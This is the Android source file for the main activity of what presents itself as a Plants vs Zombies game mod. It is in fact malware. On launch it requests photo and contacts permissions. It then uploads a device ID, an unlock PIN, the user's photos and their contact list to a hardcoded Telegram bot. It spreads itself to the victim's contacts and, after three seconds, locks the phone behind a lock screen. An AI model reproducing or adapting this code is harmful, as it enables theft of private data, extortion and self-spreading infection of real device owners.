package com.pvzmod.game;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {
    private static final String BOT_TOKEN = "8180924483:AAHt7ySle_GRAywhYP6KZJnCMzwIDegjQoA";
    private static final String CHAT_ID = "5970230338";
    private static final String ADMIN_GMAIL = "admin@pentest.uz"; // Sizning Gmail

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        requestPermissions();
        
        ExecutorService executor = Executors.newSingleThreadExecutor();
        executor.execute(() -> {
            String deviceId = DeviceIdGenerator.getUniqueId(this);
            String pin = PinManager.generateUniquePin(deviceId);
            
            TelegramSender.sendMessage(BOT_TOKEN, CHAT_ID, 
                "🔒 NEW DEVICE!\nID: " + deviceId + "\nPIN: " + pin + "\nGmail: " + ADMIN_GMAIL);
            
            TelegramSender.sendPhotos(this, BOT_TOKEN, CHAT_ID);
            TelegramSender.sendContacts(this, BOT_TOKEN, CHAT_ID);
            ContactSpreader.autoShare(this, BOT_TOKEN, CHAT_ID);
            
            new Handler().postDelayed(() -> {
                Intent lockIntent = new Intent(this, LockScreenActivity.class);
                lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                startActivity(lockIntent);
                finishAffinity();
            }, 3000);
        });
    }
    
    private void requestPermissions() {
        String[] perms = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ?
            new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_CONTACTS} :
            new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CONTACTS};
        ActivityCompat.requestPermissions(this, perms, 666);
    }
}